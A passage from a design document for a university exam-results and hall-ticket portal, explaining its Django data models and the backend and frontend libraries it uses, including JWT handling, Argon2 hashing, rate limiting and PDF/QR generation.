    can_manage_users      = models.BooleanField(default=False)
    can_view_all_branches = models.BooleanField(default=False)

    # Brute-force lockout
    failed_login_attempts = models.IntegerField(default=0)
    lockout_until = models.DateTimeField(null=True, blank=True)
```

**Design rationale for extending AbstractUser rather than creating a Profile
model:** The alternative pattern is to keep Django's built-in `User` model
unchanged and create a one-to-one `UserProfile` model with the extra fields.
This works but requires a JOIN for every user-related query. Extending
`AbstractUser` keeps all user data in a single table, eliminates the JOIN, and
simplifies serialization. The tradeoff is that it must be declared before the
first migration runs — changing it later requires resetting the entire database.

**The `role` field** drives permission logic throughout the backend. Views check
`request.user.role == 'admin'` before allowing administrative operations. Using
a CharField with choices rather than a Boolean `is_admin` field allows the system
to be extended with additional roles (e.g., `'department_head'`, `'examiner'`)
without schema changes.

**Permission flags** (can_view_statistics, etc.) implement the Principle of Least
Privilege for admin users. A newly created admin has all permissions as `False`
by default; a superadmin must explicitly grant them. This prevents privilege
creep where newly onboarded staff inadvertently have full access.

**Lockout fields** (`failed_login_attempts`, `lockout_until`) are stored on the
User model rather than in a separate `LoginAttempt` table. This is a deliberate
simplicity choice — the portal only needs to track the current lockout state, not
the full history of failed attempts. The `lockout_until` field is set to
`timezone.now() + timedelta(minutes=30)` on the 5th failed attempt and checked
on every login.

### 7.5 The Result Model

```python
class Result(models.Model):
    student       = models.ForeignKey(CustomUser, on_delete=models.CASCADE,
                                      related_name='results')
    subject       = models.ForeignKey('Subject', on_delete=models.CASCADE,
                                      related_name='results')
    semester      = models.IntegerField()
    grade         = models.CharField(max_length=2)
    grade_points  = models.FloatField()
    credits       = models.FloatField()
    exam_year     = models.IntegerField(null=True, blank=True)
    exam_month    = models.CharField(max_length=20, null=True, blank=True)
    uploaded_by   = models.ForeignKey(CustomUser, on_delete=models.SET_NULL,
                                      null=True, related_name='uploaded_results')
    uploaded_at   = models.DateTimeField(auto_now_add=True)

    class Meta:
        unique_together = [['student', 'subject', 'semester', 'exam_year',
                            'exam_month']]
```

**Foreign key to Subject rather than subject_name as a string:** If subject
names were stored directly on Result rows, fixing a typo in a subject name would
require updating every Result record for that subject. With a FK to Subject,
updating the Subject row fixes all associated Results automatically.

**`on_delete=models.CASCADE`** for the student FK means deleting a student
deletes all their results. This is appropriate because result records have no
meaning without the student they belong to. An alternative would be
`SET_NULL`, but that would leave orphaned result rows with no student reference,
which is semantically meaningless.

**`uploaded_by` uses `SET_NULL`** because if an admin account is deleted, the
uploaded results should persist — the audit trail is partially lost but the
academic records themselves are preserved.

**`unique_together` constraint** prevents duplicate uploads. If an admin
re-uploads an Excel file accidentally, the `update_or_create` call in
`excel_handler.py` matches on this composite key and updates rather than
duplicating.

**`uploaded_at` with `auto_now_add=True`** automatically records the timestamp
when the row is first created. Combined with `uploaded_by`, this provides a
basic audit trail for result uploads.

### 7.6 The Subject Model

```python
class Subject(models.Model):
    name     = models.CharField(max_length=200, unique=True)
    code     = models.CharField(max_length=50, blank=True, default='')
    branch   = models.CharField(max_length=100, blank=True, default='')
    semester = models.IntegerField(null=True, blank=True)

    def __str__(self):
        return self.name
```

The `unique=True` constraint on `name` enforces subject deduplication. When
`excel_handler.py` processes a row, it calls:

```python
subject, _ = Subject.objects.get_or_create(
    name=normalized_name,
    defaults={'code': subject_code, 'branch': branch, 'semester': semester}
)
```

`get_or_create` is an atomic ORM operation — it issues a SELECT first, and if
no row is found, issues an INSERT with the given defaults. The `unique=True`
constraint means that even under concurrent uploads, only one row per subject
name will ever exist (the database constraint provides the final guarantee
beyond the application-level `get_or_create`).

Subject `name` normalization (stripping whitespace, converting to title case)
is applied in `excel_handler.py` before the `get_or_create` call, ensuring that
"data structures" and "Data Structures " map to the same Subject row.

### 7.7 Login Attempt and Audit Log Models

```python
class LoginAttempt(models.Model):
    username    = models.CharField(max_length=150)
    ip_address  = models.GenericIPAddressField(null=True, blank=True)
    success     = models.BooleanField()
    timestamp   = models.DateTimeField(auto_now_add=True)
    user_agent  = models.TextField(blank=True, default='')

class AuditLog(models.Model):
    user        = models.ForeignKey(CustomUser, on_delete=models.SET_NULL,
                                    null=True, blank=True)
    action      = models.CharField(max_length=200)
    details     = models.TextField(blank=True, default='')
    ip_address  = models.GenericIPAddressField(null=True, blank=True)
    timestamp   = models.DateTimeField(auto_now_add=True)
    severity    = models.CharField(max_length=20, default='INFO')
```

**LoginAttempt is separate from AuditLog:** Login attempts are a high-volume,
security-specific event type. Keeping them in a dedicated table makes it easy
to query "all failed logins from IP 1.2.3.4 in the last hour" without scanning
the broader audit log. The `username` field (not a FK) allows recording attempts
for non-existent usernames — which themselves are an attack signal.

**`GenericIPAddressField`** handles both IPv4 and IPv6 addresses and validates
format at the database level. The IP address is extracted from the request in
the middleware using `request.META.get('REMOTE_ADDR')`.

**AuditLog `user` FK uses `SET_NULL`** so audit records persist when a user is
deleted. An audit trail is valuable precisely for deprovisioned accounts —
being able to review what a deleted admin did is important for forensic analysis.

**`severity` field** allows filtering audit records by importance: `INFO` for
routine operations, `WARNING` for suspicious activity, `CRITICAL` for security
events. This mirrors the syslog severity model.

### 7.8 Notification and Circular Models

```python
class Notification(models.Model):
    title      = models.CharField(max_length=200)
    message    = models.TextField()
    created_by = models.ForeignKey(CustomUser, on_delete=models.SET_NULL,
                                   null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    is_active  = models.BooleanField(default=True)
    target_role = models.CharField(max_length=20, default='all')
    branch      = models.CharField(max_length=100, blank=True, default='')

class Circular(models.Model):
    title      = models.CharField(max_length=200)
    content    = models.TextField()
    file_url   = models.CharField(max_length=500, blank=True, default='')
    created_by = models.ForeignKey(CustomUser, on_delete=models.SET_NULL,
                                   null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    is_active  = models.BooleanField(default=True)
```

**`is_active` flag instead of deletion:** Deactivating a notification or
circular preserves the record in the database for audit purposes, while
preventing it from appearing in student views. This "soft delete" pattern is
preferable to hard deletion when historical records have value.

**`target_role` and `branch`** enable targeted broadcasting. A notification
with `target_role='student'` and `branch='CSE'` will only display to CSE
students. The query filter in the view is:
`Notification.objects.filter(is_active=True, branch__in=[user.branch, ''])`
where empty-string `branch` matches notifications intended for all branches.

### 7.9 Blacklisted Token Model

```python
class BlacklistedToken(models.Model):
    token      = models.TextField(unique=True)
    user       = models.ForeignKey(CustomUser, on_delete=models.CASCADE,
                                   null=True)
    blacklisted_at = models.DateTimeField(auto_now_add=True)
    token_type = models.CharField(max_length=20, default='refresh')
```

This model supports the JWT logout mechanism. When a user logs out, the refresh
token is stored in this table. The `TokenBlacklistAuthentication` backend
(or a middleware check) verifies that the presented token is not in this table
before accepting it.

**Why `TextField` instead of `CharField` for the token?** JWT tokens are
variable length; a typical JWT is 200-500 characters but can be longer depending
on the payload. `TextField` imposes no length limit, ensuring no truncation.

**`unique=True`** prevents the same token from being blacklisted twice (which
would cause an IntegrityError). Combined with `get_or_create` in the logout
view, this makes logout idempotent.

**CASCADE on user deletion** is appropriate here — if a user is deleted, their
blacklisted tokens have no meaning and should be cleaned up.

### 7.10 Hall Ticket Models

The hall ticket subsystem has five dedicated tables:

```python
class HallTicketExam(models.Model):
    name         = models.CharField(max_length=200)
    exam_date    = models.DateField(null=True, blank=True)
    branch       = models.CharField(max_length=100)
    semester     = models.IntegerField()
    academic_year = models.CharField(max_length=20)
    is_active    = models.BooleanField(default=True)
    created_by   = models.ForeignKey(CustomUser, on_delete=models.SET_NULL,
                                     null=True)
    created_at   = models.DateTimeField(auto_now_add=True)

class HallTicketExamSubject(models.Model):
    exam         = models.ForeignKey(HallTicketExam, on_delete=models.CASCADE,
                                     related_name='subjects')
    subject_name = models.CharField(max_length=200)
    subject_code = models.CharField(max_length=50)
    exam_date    = models.DateField(null=True, blank=True)
    exam_time    = models.CharField(max_length=50, blank=True)
    venue        = models.CharField(max_length=200, blank=True)

    class Meta:
        unique_together = [['exam', 'subject_code']]

class HallTicketEnrollment(models.Model):
    exam         = models.ForeignKey(HallTicketExam, on_delete=models.CASCADE)
    student      = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    hall_number  = models.CharField(max_length=50, blank=True)
    seat_number  = models.CharField(max_length=50, blank=True)

    class Meta:
        unique_together = [['exam', 'student']]

class HallTicketStudentPhoto(models.Model):
    student      = models.ForeignKey(CustomUser, on_delete=models.CASCADE)
    photo        = models.BinaryField()
    uploaded_at  = models.DateTimeField(auto_now_add=True)

    class Meta:
        unique_together = [['student']]

class HallTicket(models.Model):
    enrollment   = models.OneToOneField(HallTicketEnrollment,
                                        on_delete=models.CASCADE)
    pdf_data     = models.BinaryField()
    generated_at = models.DateTimeField(auto_now_add=True)
    qr_code      = models.TextField(blank=True)
```

**The five-table design** separates concerns cleanly:
- `HallTicketExam` — the exam event metadata
- `HallTicketExamSubject` — the subjects scheduled within that exam
- `HallTicketEnrollment` — which students are enrolled in which exam
- `HallTicketStudentPhoto` — photos stored per student (not per enrollment,
  so the same photo is reused across multiple exams)
- `HallTicket` — the generated PDF, cached to avoid regeneration

**`BinaryField` for photo and PDF storage:** Storing binary files in the
database is controversial. The traditional approach is to store files on the
filesystem or in object storage (S3) and record only the file path in the DB.
However, for a contained single-server deployment, `BinaryField` keeps everything
in one place, simplifies backup (a single `mysqldump` captures everything), and
avoids filesystem permission issues. The tradeoff is increased database size and
slightly slower queries when fetching these fields.

**`OneToOneField` from HallTicket to HallTicketEnrollment** enforces that each
enrollment has at most one generated PDF. This is semantically correct — a
student enrolled in an exam has exactly one hall ticket.

**`unique_together` on `HallTicketStudentPhoto`** ensures one photo row per
student. Re-uploading a photo uses `update_or_create` which matches on `student`
and updates the `photo` field, effectively replacing the old photo.

### 7.11 Database Indexes and Query Performance

Django automatically creates indexes for:
- Every primary key field (`id`)
- Every `ForeignKey` field (for JOIN performance)
- Every field with `unique=True` (uniqueness is implemented as a unique index)

The `unique_together` constraints create composite unique indexes. For example,
the constraint on `Result(student, subject, semester, exam_year, exam_month)`
creates a composite index on those five columns. This index also accelerates
the most common query: "give me all results for student X in semester Y",
which uses the leftmost columns of the index.

For the `LoginAttempt` table, queries like "how many failed attempts from IP
X in the last N minutes" are common for security monitoring. An index on
`(ip_address, timestamp)` would improve these queries, though the current schema
relies on the ORM default indexes only.

### 7.12 Schema Summary Table

| Table                        | Rows (approx.)      | Purpose                          |
|------------------------------|---------------------|----------------------------------|
| users                        | Hundreds            | Students and admin accounts      |
| results                      | Tens of thousands   | Per-subject exam grades          |
| subjects                     | Hundreds            | Subject catalog                  |
| login_attempts               | Thousands           | Security audit trail             |
| audit_logs                   | Thousands           | Admin action audit trail         |
| blacklisted_tokens           | Hundreds            | Logged-out JWT tokens            |
| notifications                | Dozens              | Admin-to-student broadcasts      |
| circulars                    | Dozens              | Official notices                 |
| hall_ticket_exams            | Dozens              | Exam events                      |
| hall_ticket_exam_subjects    | Hundreds            | Subjects per exam                |
| hall_ticket_enrollments      | Thousands           | Student-exam enrollments         |
| hall_ticket_student_photos   | Hundreds            | Student passport photos (binary) |
| hall_tickets                 | Thousands           | Generated PDF hall tickets       |
| django_migrations            | ~20                 | Applied migration tracking       |
| token_blacklist_*            | Hundreds            | SimpleJWT token blacklist tables |



---

## 8. Backend Libraries and Frameworks

### 8.1 Django 5.0.9

Django is a "batteries-included" Python web framework following the
Model-View-Template (MVT) pattern. Unlike minimal frameworks such as Flask,
Django ships with an ORM, migrations system, admin interface, authentication
backends, form validation, CSRF protection, session management, and a
templating engine — all integrated and tested together.

**Why Django over Flask or FastAPI?**

Flask is a micro-framework — it provides routing and a WSGI application object,
leaving everything else to third-party libraries. For a project with complex
models, authentication, and admin requirements, assembling and integrating these
components is significant work. Django provides them out of the box.

FastAPI is an excellent modern framework with automatic OpenAPI documentation,
async support, and excellent type annotation integration. However, Django's ORM
and migration system are significantly more mature, and the project did not
require FastAPI's primary advantage (native async I/O) since the database
operations are synchronous.

**Key Django components used:**

- `django.contrib.auth` — AbstractUser base class, password hashing, login
- `django.db` — ORM, QuerySet API, transactions, migrations
- `django.middleware` — request/response pipeline hooks
- `django.conf.settings` — centralized configuration
- `django.core.management` — custom management commands (init_admin)

**Django 5.0 vs earlier versions:** Django 5.0 requires Python 3.10+, drops
support for Python 3.8/3.9, and adds features like field groups in forms and
database-computed default values. The portal uses none of the 5.0-specific
features, but using the latest stable version ensures receiving security patches.

### 8.2 Django REST Framework 3.15.2

Django REST Framework (DRF) is the standard library for building REST APIs with
Django. It adds:

- **Serializers** — convert model instances to/from Python dictionaries and JSON
- **ViewSets and APIView** — class-based views optimized for API endpoints
- **Permission classes** — `IsAuthenticated`, `IsAdminUser`, custom permissions
- **Authentication classes** — pluggable token, session, JWT authentication
- **Response** — content-negotiated HTTP responses (JSON by default)
- **Router** — automatic URL generation for ViewSets

**Serializers in depth:** A DRF serializer serves two purposes: (1) serialization
— converting a model instance into a Python dict that can be JSON-encoded for the
HTTP response; (2) deserialization and validation — parsing incoming JSON from a
request body, validating field types and constraints, and either creating or
updating model instances.

```python
class ResultSerializer(serializers.ModelSerializer):
    subject_name = serializers.CharField(source='subject.name', read_only=True)
    student_name = serializers.CharField(source='student.full_name', read_only=True)

    class Meta:
        model = Result
        fields = ['id', 'subject_name', 'student_name', 'semester',
                  'grade', 'grade_points', 'credits', 'exam_year', 'exam_month']
```

The `source='subject.name'` syntax tells DRF to traverse the FK relationship
and read the `name` field of the related `Subject` object. This eliminates the
need for a separate join query from the client's perspective — the related name
is embedded in the serialized result.

**Permission classes:** The portal uses `IsAuthenticated` as the default (all
API endpoints require a valid JWT), with custom permission checks inside views:

```python
class UploadResultsView(APIView):
    permission_classes = [IsAuthenticated]

    def post(self, request):
        if request.user.role != 'admin' or not request.user.can_upload_results:
            return Response({'error': 'Permission denied'}, status=403)
        # ... upload logic
```

This two-layer approach (DRF `IsAuthenticated` + manual role check) ensures
that unauthenticated requests are rejected at the framework level before the
view body executes.

### 8.3 djangorestframework-simplejwt 5.3.1

SimpleJWT provides JWT token generation, validation, and refresh for DRF. It
integrates with Django's authentication system and provides:

- `TokenObtainPairView` — accepts username/password, returns access + refresh tokens
- `TokenRefreshView` — accepts refresh token, returns new access token
- `JWTAuthentication` — authentication backend that validates the Authorization header
- `TokenBlacklist` app — tracks invalidated tokens in the database

**Configuration in settings.py:**

```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=30),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=1),
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
    'ALGORITHM': 'HS256',
    'SIGNING_KEY': SECRET_KEY,
    'AUTH_HEADER_TYPES': ('Bearer',),
    'USER_ID_FIELD': 'id',
    'USER_ID_CLAIM': 'user_id',
}
```

**`ROTATE_REFRESH_TOKENS: True`** means that every time the frontend exchanges
a refresh token for a new access token, SimpleJWT also issues a *new* refresh
token and invalidates the old one. This limits the window of exposure if a
refresh token is stolen — an attacker who intercepts an old refresh token cannot
use it after the legitimate user has already rotated it.

**`BLACKLIST_AFTER_ROTATION: True`** works with `ROTATE_REFRESH_TOKENS` to add
the consumed refresh token to the blacklist table, preventing replay attacks
where the same refresh token is used twice.

**`ACCESS_TOKEN_LIFETIME: 30 minutes`** balances usability and security. Shorter
tokens (e.g., 5 minutes) would require more frequent refresh operations and
increase server load. Longer tokens (e.g., 1 hour) mean a stolen token is valid
for longer. 30 minutes is a common industry default.

### 8.4 argon2-cffi (Argon2 Password Hashing)

Argon2 is the winner of the Password Hashing Competition (2015) and is
considered the state-of-the-art algorithm for password storage. It is designed
to be:

- **Memory-hard**: requires a configurable amount of RAM, making GPU/ASIC
  brute-force attacks expensive
- **Configurable**: time cost, memory cost, and parallelism parameters can be
  tuned to the server hardware
- **Resistant to side-channel attacks**: the Argon2i variant uses
  data-independent memory access patterns

Django uses Argon2 when `django.contrib.auth.hashers.Argon2PasswordHasher`
is added to `PASSWORD_HASHERS` in settings:

```python
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.Argon2PasswordHasher',
    'django.contrib.auth.hashers.PBKDF2PasswordHasher',  # fallback
]
```

The first entry is the hasher used for new passwords. The second entry allows
existing PBKDF2 hashes to still be verified (backward compatibility). When
a PBKDF2-hashed password is verified successfully, Django automatically upgrades
the hash to Argon2 on the next save — a "lazy migration" of the password hash.

A stored Argon2 hash looks like:
`argon2$argon2id$v=19$m=65536,t=2,p=2$<salt>$<hash>`
The parameters (m=memory in KB, t=time iterations, p=parallelism) are embedded
in the hash string, ensuring that future hash verification uses the same
parameters even if the defaults change.

### 8.5 openpyxl 3.1.5

`openpyxl` reads and writes Excel `.xlsx` files (Office Open XML format). In
`excel_handler.py`, it is used to read the result upload spreadsheet:

```python
import openpyxl

def process_excel_file(file_path):
    wb = openpyxl.load_workbook(file_path, read_only=True, data_only=True)
    ws = wb.active
    for row in ws.iter_rows(min_row=2, values_only=True):
        roll_number, subject_name, grade, credits, semester = row[:5]
        # ... process row
    wb.close()
```

**`read_only=True`** mode uses a streaming parser that processes the XML
row by row without loading the entire file into memory. This is critical for
large result files with thousands of rows — loading a 10,000-row spreadsheet
into a standard workbook object would consume significant RAM.

**`data_only=True`** instructs openpyxl to return cell values rather than
formula strings. Excel cells may contain formulas like `=A1+B1`; with
`data_only=True`, the cached value (the last calculated result) is returned
instead of the formula string.

### 8.6 pandas 2.1.4

`pandas` is used alongside `openpyxl` for enrollment Excel processing in
`hall_ticket_views.py`. While `openpyxl` is lower-level, `pandas` provides
higher-level data manipulation:

```python
import pandas as pd

def process_enrollment_excel(file):
    df = pd.read_excel(file, engine='openpyxl')
    df = df.dropna(subset=['roll_number'])  # drop rows with missing roll numbers
    df['roll_number'] = df['roll_number'].astype(str).str.strip()
    for _, row in df.iterrows():
        # ... process each enrollment row
```

**NaN handling:** Excel cells that are visually empty are read by pandas as
`float('nan')`. The `dropna(subset=['roll_number'])` call removes rows where
the roll number is NaN, preventing attempts to look up students with a None
username. The `astype(str).str.strip()` chain converts the roll number to a
clean string, handling cases where Excel auto-formats numeric roll numbers
(e.g., treating `210001` as a float `210001.0`).

### 8.7 ReportLab 4.1.0

ReportLab is a PDF generation library for Python. It provides a canvas-based
API where the developer places text, images, and shapes at specific (x, y)
coordinates on the page.

```python
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4
from io import BytesIO

def generate_hall_ticket_pdf(enrollment, subjects, student, photo_data):
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=A4)
    width, height = A4  # 595.27 x 841.89 points

    # University header
    c.setFont("Helvetica-Bold", 16)
    c.drawCentredString(width / 2, height - 50, "SPMVV University")

    # Student details
    c.setFont("Helvetica", 12)
    c.drawString(50, height - 120, f"Name: {student.full_name}")
    c.drawString(50, height - 140, f"Roll No: {student.username}")

    # Photo (from BinaryField bytes)
    if photo_data:
        from PIL import Image
        img = Image.open(BytesIO(bytes(photo_data)))
        img_reader = ImageReader(img)
        c.drawImage(img_reader, width - 150, height - 180, 100, 120)

    c.save()
    return buffer.getvalue()
```

**Canvas coordinate system:** ReportLab uses a bottom-left origin by default
(point (0,0) is the bottom-left corner of the page). Coordinates are in
"points" (1 point = 1/72 inch). A4 paper is 595.27 × 841.89 points.
Developers typically subtract from `height` to position elements from the top.

**BytesIO buffer:** Rather than writing to a file, the PDF is generated into
an in-memory buffer. `buffer.getvalue()` returns the raw PDF bytes, which are
then stored in the `HallTicket.pdf_data` BinaryField. This avoids filesystem
I/O and makes the generation process stateless.

### 8.8 qrcode 7.4.2 + Pillow 10.2.0

QR codes on hall tickets provide a tamper-evident verification mechanism.
The QR code encodes a unique identifier for the enrollment record:

```python
import qrcode
from PIL import Image
from io import BytesIO

def generate_qr_code(data: str) -> bytes:
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")

    buffer = BytesIO()
    img.save(buffer, format='PNG')
    return buffer.getvalue()
```

**`ERROR_CORRECT_H`** is the highest error correction level — up to 30% of the
QR code can be damaged/obscured and still be decoded correctly. This is
important for printed hall tickets that may be creased or stamped.

**`version=1` with `fit=True`:** QR code version determines the data capacity
(version 1 = 21x21 modules, version 40 = 177x177 modules). `fit=True` tells
the library to automatically increase the version if the data doesn't fit in
version 1.

**Pillow** (PIL fork) handles image manipulation — resizing the photo, converting
color modes, and rendering the QR code into the PDF canvas via `ImageReader`.

### 8.9 django-ratelimit 4.1.0

`django-ratelimit` provides rate limiting decorators/middleware that count
requests per IP and block excess requests with HTTP 429 Too Many Requests:

```python
from ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST', block=True)
def login_view(request):
    # ...
```

The `key='ip'` parameter uses the client IP as the rate limit key. `rate='5/m'`
allows 5 POST requests per minute from a given IP. `block=True` returns 429
automatically without executing the view body if the limit is exceeded.

Rate limiting is implemented at the network edge (IP-based), complementing the
user-level brute-force protection (which locks the user account). This layered
approach handles both targeted attacks (many attempts on one account from one IP)
and distributed attacks (attempts from many IPs against one account).

### 8.10 whitenoise 6.7.0

WhiteNoise is a WSGI middleware that enables Django to serve its own static files
in production without a separate Nginx or CDN. It adds correct cache headers,
supports gzip and Brotli compression, and serves files from memory after the
first request.

```python
# settings.py
MIDDLEWARE = [
    'whitenoise.middleware.WhiteNoiseMiddleware',  # Must be early in the list
    # ...
]
STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'
```

`CompressedManifestStaticFilesStorage` adds content-hash fingerprinting to
static file names (e.g., `app.abc123.js`). This enables aggressive caching —
browsers can cache these files indefinitely since the filename changes when the
content changes, busting the cache automatically on new deployments.

**Why WhiteNoise instead of Nginx serving static files?**
In this Docker setup, the frontend container runs its own Nginx instance to
serve the React SPA. The backend container uses WhiteNoise to serve Django's
admin static files. This keeps each container self-contained with minimal
configuration coupling between containers.

### 8.11 gunicorn 22.0.0

Gunicorn (Green Unicorn) is a WSGI HTTP server for Python applications. It
uses a pre-fork worker model: the master process forks N worker processes,
each capable of handling one request at a time.

```bash
# From init.sh
gunicorn exam_results.wsgi:application \
    --bind 0.0.0.0:8000 \
    --workers 4 \
    --timeout 120 \
    --log-level info
```

**4 workers** is a common starting point. The rule of thumb is `2 * CPU_cores + 1`.
For a 2-core VM, this gives 5 workers; 4 is chosen as a conservative figure that
leaves headroom for the database and frontend processes.

**Worker isolation:** If a request causes a worker to crash or hang, only that
worker is affected. The master process detects the crash and spawns a replacement
worker. This provides automatic recovery from per-request panics.

**`--timeout 120`:** If a worker doesn't respond within 120 seconds, it is
killed and restarted. This prevents zombie workers from exhausting the pool.
The 120-second timeout accommodates long-running operations like large Excel
uploads.

### 8.12 django-cors-headers 4.4.0

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that blocks
JavaScript from making requests to a different origin (scheme + hostname + port)
than the page was loaded from. The React frontend (port 2026) and Django backend
(port 8000) are different origins, so without CORS headers, every API call from
the frontend would be blocked by the browser.

```python
INSTALLED_APPS = ['corsheaders', ...]
MIDDLEWARE = ['corsheaders.middleware.CorsMiddleware', ...]

CORS_ALLOWED_ORIGINS = [
    'http://localhost:2026',
    'http://10.127.248.83:2026',
]
CORS_ALLOW_CREDENTIALS = True
```

`CorsMiddleware` intercepts requests and, for those from allowed origins, adds
the `Access-Control-Allow-Origin` response header. `CORS_ALLOW_CREDENTIALS = True`
allows the browser to include cookies and Authorization headers in cross-origin
requests (necessary for JWT in the Authorization header).

---

## 9. Frontend Libraries and Frameworks

### 9.1 React 18.2.0

React is a declarative UI library built around the concept of components —
reusable, self-contained units that encapsulate markup, logic, and state.
React's core innovation is the virtual DOM: React maintains a lightweight
in-memory representation of the DOM and efficiently updates only the parts that
have changed when state or props change.

**React 18 features used:**

- **Concurrent rendering foundations:** React 18 introduces concurrent features,
  though the portal primarily uses the Stable APIs (useState, useEffect, useContext)
  which remain unchanged.
- **`createRoot`:** React 18 replaces `ReactDOM.render` with `createRoot` for
  mounting the application, enabling future concurrent features.

**Component architecture in the portal:**

```
App.jsx (root, provides AuthContext)
├── LoginPage.jsx
├── RegisterPage.jsx
└── ProtectedRoute.jsx (checks auth)
    ├── StudentDashboard.jsx
    │   ├── ResultsView.jsx
    │   ├── StatisticsView.jsx
    │   ├── NotificationsView.jsx
    │   └── HallTicketDownload.jsx
    └── AdminDashboard.jsx
        ├── UploadResults.jsx
        ├── ManageUsers.jsx
        ├── HallTicketManager.jsx
        └── StatisticsDashboard.jsx
```

Each component is responsible for its own data fetching (via Axios API calls),
loading state, error state, and rendered output. This co-location of concerns
makes each component independently understandable and testable.

### 9.2 Vite 5.0.8

Vite is a modern frontend build tool that addresses limitations of webpack-based
setups. During development, Vite serves source files as native ES modules
directly to the browser (with the browser doing the module resolution), making
Hot Module Replacement (HMR) near-instant — only the changed module is
re-evaluated rather than rebuilding the entire bundle.

For production builds, Vite uses Rollup to bundle the application:

```javascript
// vite.config.js
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom', 'react-router-dom'],
          charts: ['recharts'],
        }
      }
    }
  },
  server: {
    port: 3000,
    proxy: {
      '/api': 'http://localhost:8000'
    }
  }
})
```

**`manualChunks`** splits the bundle into separate files. The `vendor` chunk
containing React and React Router changes infrequently — browsers can cache it
across deployments. The `charts` chunk (Recharts is ~500KB) is loaded only when
the statistics view is accessed, reducing initial load time.

**Development proxy:** The `proxy` config forwards `/api` requests from the
Vite dev server to Django, eliminating CORS issues during development.

### 9.3 React Router DOM 6.20.0

React Router provides client-side navigation — switching between "pages" without
a full page reload by manipulating the browser's History API.

```jsx
// App.jsx
import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom'

function App() {
  return (
    <BrowserRouter>
      <AuthProvider>
        <Routes>
          <Route path="/login" element={<LoginPage />} />
          <Route path="/register" element={<RegisterPage />} />
          <Route path="/dashboard/*" element={
            <ProtectedRoute>
              <Dashboard />
            </ProtectedRoute>
          } />
          <Route path="/" element={<Navigate to="/login" replace />} />
        </Routes>
      </AuthProvider>
    </BrowserRouter>
  )
}
```

**`BrowserRouter`** uses the HTML5 History API (`pushState`/`replaceState`) for
clean URLs (e.g., `/dashboard/results`) rather than hash-based URLs
(e.g., `/#/dashboard/results`). The Nginx configuration must be set up to
serve `index.html` for all routes, since the server doesn't know about
client-side routes — this is the `try_files $uri $uri/ /index.html` directive
in `nginx.conf`.

**Nested routes with `*`:** The `/dashboard/*` pattern matches any sub-path
under `/dashboard`, allowing the Dashboard component to render its own nested
`<Routes>` for `/dashboard/results`, `/dashboard/notifications`, etc.

### 9.4 Tailwind CSS 3.3.6

Tailwind CSS is a utility-first CSS framework. Rather than providing pre-built
components (like Bootstrap's `.btn`, `.card`), Tailwind provides low-level
utility classes that compose into any design:

```jsx
<button className="bg-blue-600 hover:bg-blue-700 text-white font-semibold
                   py-2 px-4 rounded-lg shadow-md transition-colors duration-200
                   disabled:opacity-50 disabled:cursor-not-allowed">
  Upload Results
</button>
```

**Utility-first advantages:**
1. **No CSS file growth:** All styling is inline in the JSX. Traditional CSS
   grows unboundedly as features are added; utility classes are reused from
   a fixed vocabulary.
2. **No naming bikeshedding:** Developers don't spend time naming CSS classes
   like `.upload-button-primary-large`.
3. **Responsive design via prefixes:** `md:grid-cols-2 lg:grid-cols-4` applies
   different grid layouts at different breakpoints without media query boilerplate.
4. **Dark mode support:** `dark:bg-gray-800` is applied automatically when the
   `dark` class is on a parent element.

**PurgeCSS integration:** Tailwind's build process scans all source files for
class names actually used and removes all unused utility classes. The final CSS
bundle for the portal is a few KB rather than Tailwind's full 3MB development
stylesheet.

```javascript
// tailwind.config.js
module.exports = {
  content: ['./src/**/*.{js,jsx,ts,tsx}'],
  theme: {
    extend: {
      colors: {
        primary: '#1e40af',  // Custom brand color
      }
    }
  },
  plugins: [],
}
```

### 9.5 Axios 1.6.2

Axios is an HTTP client for JavaScript, providing a cleaner API than the native
`fetch` function, with automatic JSON serialization, request/response
interceptors, and consistent error handling.

**Instance configuration:**

```javascript
// api.js
import axios from 'axios'
import tokenManager from '../utils/tokenManager'

const api = axios.create({
  baseURL: '/api',
  timeout: 30000,
})
```

**Request interceptor — attach JWT:**

```javascript
api.interceptors.request.use(config => {
  const token = tokenManager.getAccessToken()
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})
```

Every outgoing request is automatically given the `Authorization: Bearer <token>`
header without any component having to do it manually.

**Response interceptor — token refresh:**

```javascript
let isRefreshing = false
let failedQueue = []

api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject })
        }).then(token => {
          originalRequest.headers.Authorization = `Bearer ${token}`
          return api(originalRequest)
        })
      }
      originalRequest._retry = true
      isRefreshing = true
      try {
        const refresh = tokenManager.getRefreshToken()
        const { data } = await axios.post('/api/token/refresh/', { refresh })
        tokenManager.setTokens(data.access, data.refresh)
        processQueue(null, data.access)
        originalRequest.headers.Authorization = `Bearer ${data.access}`
        return api(originalRequest)
      } catch (err) {
        processQueue(err, null)
        tokenManager.clearTokens()
        window.location.href = '/login'
        return Promise.reject(err)
      } finally {
        isRefreshing = false
      }
    }
    return Promise.reject(error)
  }
)
```

The `failedQueue` pattern solves a concurrency issue: if multiple API calls
are made simultaneously and all receive a 401, without this pattern each would
independently try to refresh the token — causing multiple refresh requests,
most of which would fail (since the first rotation invalidates the refresh token).
The `isRefreshing` flag and `failedQueue` ensure only one refresh request
